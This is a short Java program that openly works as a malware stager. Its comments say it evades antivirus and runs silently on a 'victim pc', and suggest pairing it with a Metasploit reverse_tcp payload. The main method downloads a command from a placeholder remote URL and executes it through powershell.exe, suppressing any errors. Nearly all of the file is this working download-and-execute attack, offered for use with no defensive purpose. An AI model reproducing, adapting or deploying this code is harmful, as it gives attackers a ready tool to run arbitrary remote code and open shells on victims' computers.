

import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;
import java.util.Scanner;

public class init {
	// Bypass any anti-virus with  powershell payload
	// this shit get the txt uploaded powershell and insta-execute on the victim pc
	// u can create the powershell reverse_tcp payload script
	// on the metasploit framework
	// Script dont open the cmd console
	// Created by Gabriell H. Foda-se Use por sua responsabilidade!
	
	// powershell file payload to exec change the HTTP variable
	// And export on a jar file
	private static final String HTTP = "http://xxx.xxx.xx.xx.xx:8080/xxx.txt";
	//
	//                               You need to change this url /\ /\ /\
	//
	//
	private static Scanner s;

	public static void main(String[] args) {
		try {
			// Execute command
			
			URL url = new URL(HTTP);
			s = new Scanner(url.openStream());
			String command = "powershell.exe " + s.nextLine();
			Process child = Runtime.getRuntime().exec(command);
			OutputStream out = child.getOutputStream();
			out.flush();
			out.close();

		} catch (IOException e) {
			// System.out.println(e);
		}
	}
}
